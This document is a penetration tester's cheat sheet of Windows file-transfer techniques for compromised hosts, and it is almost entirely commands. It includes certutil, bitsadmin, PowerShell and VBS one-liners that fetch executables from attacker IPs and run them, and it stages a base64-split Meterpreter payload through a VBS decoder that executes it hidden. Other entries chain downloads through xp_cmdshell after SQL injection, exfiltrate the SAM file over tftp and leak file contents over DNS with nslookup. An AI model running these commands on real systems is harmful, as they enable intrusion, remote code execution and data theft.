# Windows File transfer

## certutil

```cheat filetransfer download file
certutil.exe -urlcache -split -f http://<url>/<file> <outfile>
```

## rundll32.exe
### Drops File into Microsoft>Windows>INETCache>IE>.....
```
RUNDLL32.EXE "C:\Windows\System32\scrobj.dll",GenerateTypeLib test.sct http://127.0.0.1/mtrpr3333.png
```

## bitsadmin
Since Windows 2003 SP1 + Win7 + WinXP (in optinal Support Tools)

```cheat filetransfer Download using bitsadmin
bitsadmin /transfer job1 /download /priority high http://<ip>/<file> %TEMP%\<outfile>
```

## ftp
The following code snippet is very FRAGILE (spaces, tabs,...)!!!

```bat cheat filetransfer Using FTP
echo open 192.168.2.200 21> ftpc.txt & echo joe>> ftpc.txt
echo pass>> ftpc.txt
echo bin>> ftpc.txt & echo get file.exe>> ftpc.txt & echo bye>> ftpc.txt & type .\ftpc.txt & ftp -d -s:.\ftpc.txt
```

## rdp
### rdesktop
```
rdesktop 192.168.0.1 -r disk:share=/root/Desktop/RDPmount/ -g 1024x768
```
### xfreerdp
```
xfreerdp /u:user /p:password /v:10.10.10.10 /dynamic-resolution  /drive:E,/home/yoMama1337/engagement/fooo
```

## smb
```
smbclient -U Administrator //172.16.1.1/C$
put file.exe
get victimfile.exe destfile.exe
```

## smb to kali
on kali
```
impacket-smbserver SHARE /home/xxx/xxx/xx.exe
```

on victim
```
net view \\10.10.10.x
dir \\10.10.10.x\SHARE

copy \\10.10.10.x\SHARE\privesc.exe .
```



### List Shares at Host
```
smbclient -U admin -L \\\\10.10.10.10\\
```
### Fetch a whole Directory via smbclient
```
tarmode
recurse
prompt
mget "foldertocopy"
```
### Blind exfil
You will have to use smbclient or similar on Linux:
net user && net use Q: \\BUILD-v6\web /user:foobar && copy C:\users\foobar\test.txt Q:\win.txt

## MSSQL - in case of SQLi

### i.e. you should chain methods like ftp via xp_cmdshell
```
exec master..xp_cmdshell 'echo open 10.0.8.2> C:\\temp\\ftpmet.txt'
exec master..xp_cmdshell 'echo joe>> C:\\temp\\ftpmet.txt'
exec master..xp_cmdshell 'echo pass>> C:\\temp\\ftpmet.txt'
exec master..xp_cmdshell 'echo bin>> C:\\temp\\ftpmet.txt'
exec master..xp_cmdshell 'echo get FILE.exe>> C:\\temp\\ftpmet.txt'
exec master..xp_cmdshell 'echo bye>> C:\\temp\\ftpmet.txt'
exec master..xp_cmdshell 'ftp -s:C:\\temp\\ftpmet.txt'
exec master..xp_cmdshell 'FILE.exe';
```
### or via Metasploit in case of leaked/known credentials - auxiliary/admin/mssql/mssql_exec
```
set cmd cmd.exe /c 'echo open 172.16.1.33 21> c:\ftp.txt'
run
set cmd cmd.exe /c 'echo joe>> c:\ftp.txt'
run
set cmd cmd.exe /c 'echo pass>> c:\ftp.txt'
run
set cmd cmd.exe /c 'echo bin>> c:\ftp.txt'
run
set cmd cmd.exe /c 'echo lcd c:\ >> c:\ftp.txt'
run
set cmd cmd.exe /c 'echo get file.exe>> c:\ftp.txt'
run
set cmd cmd.exe /c 'echo bye>> c:\ftp.txt'
run
```

### Verify content of the file
set cmd cmd.exe /c 'type C:\ftp.txt'
run
### initiated the transfer
set cmd cmd.exe /c  'ftp -d -s:c:\ftp.txt'
run
### Verify file size on target
set cmd cmd.exe /c  'dir c:\'
### Execute File
set cmd 'c:\file.exe'

## or try SQLMAP

## mount
```
net use x: \\filesvr001\folder1 <password> /user:domain01\AdminVictim /savecred /p:no
```

## Inline Shell vbscript in 3 Steps
Reverse-Engineered from Shell2Meterpreter - Max 1676 Chars per echo packet
max payload per line -> 4,072 chars in payload.b64 (4095 incl command)

### Step 1 - Spliting

```bash cheat filetransfer Splitting
split -b 4000 meterpreter.exe tmpSplitName.X && ls tmpSplitName.X*
tmpSplitName.Xaa
tmpSplitName.Xab
...
for e in $(ls tmpSplitName.X*); do echo "echo $(base64 $e | tr -d '\n') >> %TEMP%\payload.b64" ; done
```

### Step 2 - copy paste (Example):

```cheat filetransfer copy paste
echo SGVsbG8gSW5saW5lIFNoZWxs > %TEMP%\payload.b64
```

### decode onliner - writes itself to %TEMP%\decode.vbs expacts %TEMP%\payload.b64

```cheat filetransfer write decoder
echo Set fs = CreateObject("Scripting.FileSystemObject") >>%TEMP%\decode.vbs & echo Set file = fs.GetFile("%TEMP%\payload.b64") >>%TEMP%\decode.vbs & echo If file.Size Then >>%TEMP%\decode.vbs & echo Set fd = fs.OpenTextFile("%TEMP%\payload.b64", 1) >>%TEMP%\decode.vbs & echo data = fd.ReadAll >>%TEMP%\decode.vbs & echo data = Replace(data, vbCrLf, "") >>%TEMP%\decode.vbs & echo data = base64_decode(data) >>%TEMP%\decode.vbs & echo fd.Close >>%TEMP%\decode.vbs & echo Set ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile("%TEMP%\decoded.exe", 2, True) >>%TEMP%\decode.vbs & echo ofs.Write data >>%TEMP%\decode.vbs & echo ofs.close >>%TEMP%\decode.vbs & echo Set shell = CreateObject("Wscript.Shell") >>%TEMP%\decode.vbs & echo shell.run "%TEMP%\decoded.exe", 0, false >>%TEMP%\decode.vbs & echo Else >>%TEMP%\decode.vbs & echo Wscript.Echo "The file is empty." >>%TEMP%\decode.vbs & echo End If >>%TEMP%\decode.vbs & echo Function base64_decode(byVal strIn) >>%TEMP%\decode.vbs & echo Dim w1, w2, w3, w4, n, strOut >>%TEMP%\decode.vbs & echo For n = 1 To Len(strIn) Step 4 >>%TEMP%\decode.vbs & echo w1 = mimedecode(Mid(strIn, n, 1)) >>%TEMP%\decode.vbs & echo w2 = mimedecode(Mid(strIn, n + 1, 1)) >>%TEMP%\decode.vbs & echo w3 = mimedecode(Mid(strIn, n + 2, 1)) >>%TEMP%\decode.vbs & echo w4 = mimedecode(Mid(strIn, n + 3, 1)) >>%TEMP%\decode.vbs & echo If Not w2 Then _ >>%TEMP%\decode.vbs & echo strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255)) >>%TEMP%\decode.vbs & echo If  Not w3 Then _ >>%TEMP%\decode.vbs & echo strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255)) >>%TEMP%\decode.vbs & echo If Not w4 Then _ >>%TEMP%\decode.vbs & echo strOut = strOut + Chr(((w3 * 64 + w4) And 255)) >>%TEMP%\decode.vbs & echo Next >>%TEMP%\decode.vbs & echo base64_decode = strOut >>%TEMP%\decode.vbs & echo End Function >>%TEMP%\decode.vbs & echo Function mimedecode(byVal strIn) >>%TEMP%\decode.vbs & echo Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" >>%TEMP%\decode.vbs & echo If Len(strIn) = 0 Then >>%TEMP%\decode.vbs & echo mimedecode = -1 : Exit Function >>%TEMP%\decode.vbs & echo Else >>%TEMP%\decode.vbs & echo mimedecode = InStr(Base64Chars, strIn) - 1 >>%TEMP%\decode.vbs & echo End If >>%TEMP%\decode.vbs & echo End Function >>%TEMP%\decode.vbs & cscript //nologo %TEMP%\decode.vbs & del %TEMP%\decode.vbs & del %TEMP%\payload.b64
```
## More VBS
### Method A oneliner works for Win7 cmd.exe   Special Chars: > & . ( ) , = "
```
echo strFileURL = WScript.Arguments.Item(0)  > wget.vbs & echo strHDLocation = WScript.Arguments.Item(1)  >> wget.vbs & echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> wget.vbs & echo objXMLHTTP.open "GET", strFileURL, false >> wget.vbs & echo objXMLHTTP.send() >> wget.vbs & echo If objXMLHTTP.Status = 200 Then >> wget.vbs & echo Set objADOStream = CreateObject("ADODB.Stream") >> wget.vbs & echo objADOStream.Open >> wget.vbs & echo objADOStream.Type = 1 >> wget.vbs & echo objADOStream.Write objXMLHTTP.ResponseBody >> wget.vbs & echo objADOStream.Position = 0 >> wget.vbs & echo Set objFSO = Createobject("Scripting.FileSystemObject") >> wget.vbs & echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> wget.vbs & echo Set objFSO = Nothing >> wget.vbs & echo objADOStream.SaveToFile strHDLocation >> wget.vbs & echo objADOStream.Close >> wget.vbs & echo Set objADOStream = Nothing >> wget.vbs & echo End if >> wget.vbs & echo Set objXMLHTTP = Nothing >> wget.vbs
```
execute:
```
cmd.exe /c "cscript wget.vbs http://192.168.2.200/file.exe file.exe"
```

### Method B oneliner needs TESTING via XP_cmdshell   Special Chars: > & . ( ) , = "
```
exec master..xp_cmdshell 'cmd /c "echo strFileURL = WScript.Arguments.Item(0)  > C:\temp\wget.vbs & echo strHDLocation = WScript.Arguments.Item(1)  >> C:\temp\wget.vbs & echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> C:\temp\wget.vbs & echo objXMLHTTP.open "GET", strFileURL, false >> C:\temp\wget.vbs & echo objXMLHTTP.send() >> C:\temp\wget.vbs & echo If objXMLHTTP.Status = 200 Then >> C:\temp\wget.vbs & echo Set objADOStream = CreateObject("ADODB.Stream") >> C:\temp\wget.vbs & echo objADOStream.Open >> C:\temp\wget.vbs & echo objADOStream.Type = 1 >> C:\temp\wget.vbs & echo objADOStream.Write objXMLHTTP.ResponseBody >> C:\temp\wget.vbs & echo objADOStream.Position = 0 >> C:\temp\wget.vbs & echo Set objFSO = Createobject("Scripting.FileSystemObject") >> C:\temp\wget.vbs & echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> C:\temp\wget.vbs & echo Set objFSO = Nothing >> C:\temp\wget.vbs & echo objADOStream.SaveToFile strHDLocation >> C:\temp\wget.vbs & echo objADOStream.Close >> C:\temp\wget.vbs & echo Set objADOStream = Nothing >> C:\temp\wget.vbs & echo End if >> C:\temp\wget.vbs & echo Set objXMLHTTP = Nothing >> C:\temp\wget.vbs "'
```
execute:
```
exec master..xp_cmdshell 'cmd /c "cscript C:\temp\wget.vbs http://10.0.8.2/Wmrt3333.exe C:\temp\Wmrt3333.exe"'
```
#### Method C onliner - is kind of SLOW works Win7
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs & echo StrFile = WScript.Arguments.Item(1) >> wget.vbs & echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs & echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs & echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs & echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs & echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs & echo Err.Clear >>wget.vbs & echo Set http = Nothing >> wget.vbs & echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs & echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs & echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs  & echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")>>wget.vbs & echo http.Open "GET", strURL, False >> wget.vbs  & echo http.Send >> wget.vbs & echo varByteArray = http.ResponseBody >>wget.vbs & echo Set http = Nothing >> wget.vbs & echo Set fs = CreateObject("Scripting.FileSystemObject") >>wget.vbs & echo Set ts = fs.CreateTextFile(StrFile,True) >>wget.vbs & echo strData = "" >> wget.vbs & echo strBuffer = "" >> wget.vbs & echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs  & echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs & echo Next >>wget.vbs & echo ts.Close >> wget.vbs
```
execute:
```
cmd.exe /c "cscript wget.vbs http://172.16.254.26/file.exe file.exe"
```

#### Execution variants for Downloader
```
cmd.exe /c "cd / & dir /s /b cscript.exe"
cmd.exe /c "cd / & dir /s /b wscript.exe"
cscript wget.vbs http://192.168.2.200/file.exe file.exe
wscript wget.vbs http://192.168.2.200/file.exe file.exe
```
### EXE to VBS converter in Python
* github.com/dnet/base64-vbs.py
```bash cheat filetransfer file
python base64.py input.exe output.vbs
```

## powershell

```cheat filetransfer Download using powershell
Powershell.exe -exec bypass -Command Invoke-WebRequest "http://<ip>/<filename.exe>" -OutFile "C:\<path>\<filename>.exe"
```

```bash cheat filetransfer file powershell
powershell -executionPolicy bypass  -command "& { (New-Object Net.WebClient).DownloadFile('http://192.168.2.200/file.exe', 'C:\Users\benny\Desktop\file.exe') }"
```

```bash cheat filetransfer file powershell
cmd.exe /c "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://www.greyhathacker.net/tools/messbox.exe','mess.exe');(New-Object -com Shell.Application).ShellExecute('mess.exe')"
```

### Onliner via cmd - tested on Win7
```bash cheat filetransfer file powershell
echo param([string]$url); > get.ps1 & echo $filename = $url.Substring($URL.LastIndexOf("/") + 1) >> get.ps1 & echo $webclient = New-Object System.Net.WebClient >> get.ps1 & echo $file = "$pwd\$filename" >> get.ps1 & echo Write-Host "downloading to file: $file"; >> get.ps1 & echo $webclient.DownloadFile($url,$file) >> get.ps1

powershell -executionPolicy bypass -command ".\get.ps1 http://192.168.2.200/file.exe"
```

## tftp - Windows 7, Win2008, VISTA
tftp is optional software

### Setup the TFTP server
mkdir  /tftp
atftpd ‐‐daemon -­­‐port 69 /tftp
cp /usr/share/windows­‐binaries/nc.exe /tftp/

### Setup alternative
/etc/init.d/atftpd start
cp /usr/share/windows­‐binaries/nc.exe /srv/tftp/

### Invoke  the  tftp  client
tftp -i HOSTADDR GET nc.exe
tftp -i HOSTADDR PUT sam
cmd.exe?/x+/c+"tftp.exe+-i+172.16.254.42+GET+Wshell3333.exe"


## dns
Exifltrate files from windows. Run Wireshark or TCPDump on your host and then extract the exifltrated content and unhex it

```bat cheat filetransfer Exfiltrate using nslookup
net user && powershell -executionpolicy bypass "Get-Content "C:\exfill-me.txt" | ForEach-Object {nslookup $_ <ip>}"
```

## debug.exe
works on 32bit systems only
"EXE to BAT converter" Version 2.0 uses a BASE64 decoder stub
./e2b.py nc    # do not supply the extension ".exe"
unix2dos nc.bat

### decode.exe-formater.py - Don't remember what this was - but it was very cool
decode.exe-formater.py --file nc.exe -o 100 --prefix "exec xp_cmdshell 'echo " -a 4 --postfix ">> C:\temp\f1.txt';" > sqli

### Optional pack it with UPX
upx -9 file.exe


## internet explorer - Default Browser
```bash cheat filetransfer Download with explorer.exe

cmd.exe /c "cd / & dir /s /b explorer.exe"
C:\windows\explorer.exe http://<ip>/file.jpg
cmd.exe /c "cd / & dir /s /b file.jpg"
```

### Download file with I.E.
```bash cheat filetransfer Download with IE
cd / & dir /s /b iexplore.exe
"C:\Program Files\Internet Explorer\iexplore.exe" http://<ip>/shell.gif
[Press ENTER once more]
```

### Alterative I.E.
```bash cheat filetransfer Download with IE 2
cd C:\Program Files\Internet Explorer
iexplore.exe http://<ip>/shell.gif
```

### WinXP - retrieve file
```bash cheat filetransfer retrieve file on XP
chdir C:\Documents and Settings\MasterJoda\
cd / & dir /s /b nc.png
....look for nc.png
chdir C:\Documents and Settings\MasterJoda\Local Settings\Temporary Internet Files\Content.IE5\EUQBFA2G
copy nc.png C:\nc.exe
```

### TODO - Windows Vista + Windows 7:
move "C:\Users\benny\AppData\Local\Microsoft\Windows\Temporary Internet Files\file.jpg" file.exe

### TODO - Windows 8 + 8.1:
C:\Users\benny\AppData\Local\Microsoft\Windows\INetCache\file.jpg
```bash cheat filetransfer file
cmd.exe /c "cd / & dir /s /b 'Temporary Internet Files'"
```
get the file from the temp files...

## python
```
C:\Python27\python.exe -c "import urllib; urllib.urlretrieve ('http://192.168.2.200/file.exe', r'C:\Users\benny\Desktop\file.exe')"
```

## cmdln32.exe
CMAK (Connection Manager Administration Kit) is used to set up Connection Manager service profiles, which can be used to download files
* www.hexacorn.com/blog/2017/04/30/the-archaeologologogology-3-downloading-stuff-with-cmdln32/
```bash cheat filetransfer file
cmdln32 c:\test\profile /vpn
```

## via HTA
via-kioskBreakOut-hta-rwxl.hta

## links
* https://www.jollyfrogs.com/transfer-files-windows/

tags: #windows #certutil #bitsadmin #links #pentest #admin #cmdln32 
